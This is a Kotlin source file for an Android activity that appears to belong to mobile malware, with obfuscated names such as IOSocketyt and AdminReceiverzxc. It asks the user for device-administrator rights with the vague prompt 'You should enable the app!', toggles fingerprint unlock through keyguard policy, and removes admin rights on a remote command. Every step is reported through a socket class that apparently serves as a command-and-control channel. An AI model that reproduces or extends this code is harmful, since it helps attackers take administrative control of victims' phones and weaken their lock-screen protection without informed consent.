package com.xxx.zzz.adminp

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import com.xxx.zzz.socketsp.IOSocketyt


class ActivityAdminqw : Activity() {

    var mAdminComponent: ComponentName? = null
    fun setFingerprintDisabled(userId: Int) {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return
        if (mAdminComponent == null) {
            mAdminComponent = ComponentName(this, AdminReceiverzxc::class.java)
        }
        activateAdmin()
        val status = dpm.getKeyguardDisabledFeatures(mAdminComponent)
        try {
            if (dpm.isAdminActive(mAdminComponent!!)) {
                if ((dpm.getKeyguardDisabledFeatures(mAdminComponent) and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT) != 0) {
                    dpm.setKeyguardDisabledFeatures(mAdminComponent!!, status and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT.inv())
                    IOSocketyt.sendLogs(
                        "",
                        "setKeyguardDisabledFeatures status and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT.inv()",
                        "success"
                    )
                } else {
                    dpm.setKeyguardDisabledFeatures(mAdminComponent!!, status or DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT)
                    IOSocketyt.sendLogs(
                        "",
                        "setKeyguardDisabledFeatures status and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT",
                        "success"
                    )
                }
            }
        } catch (e: Exception) {
            IOSocketyt.sendLogs("", "setFingerprintDisabled ${e.localizedMessage}", "error")
        }
    }

    private fun activateAdmin() {
        runCatching {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminComponent ?: ComponentName(this, AdminReceiverzxc::class.java))
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "You should enable the app!")
            startActivity(intent)
            IOSocketyt.sendLogs("", "activateAdmin", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "activateAdmin ${it.localizedMessage}", "error")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        runCatching {
            val componentName = ComponentName(this.packageName, AdminReceiverzxc::class.java.name)
            if (intent.getStringExtra("admin") == "1") {
                val activateDeviceAdmin = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "You should enable the app!")
                startActivityForResult(activateDeviceAdmin, 100)
                IOSocketyt.sendLogs("", "ActivityAdmin activateDeviceAdmin", "success")
            } else {
                val mAdminReceiverzxc = ComponentName(this, AdminReceiverzxc::class.java)
                val devicePolicyManager = applicationContext.getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                devicePolicyManager.removeActiveAdmin(mAdminReceiverzxc)
                IOSocketyt.sendLogs("", "ActivityAdmin removeActiveAdmin", "success")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "ActivityAdmin error ${it.localizedMessage}", "error")
        }
        finish()
    }


    companion object {
        fun isAdminDevice(context: Context): Boolean {
            val deviceManager = context.applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, AdminReceiverzxc::class.java)
            return deviceManager.isAdminActive(componentName)
        }
    }
}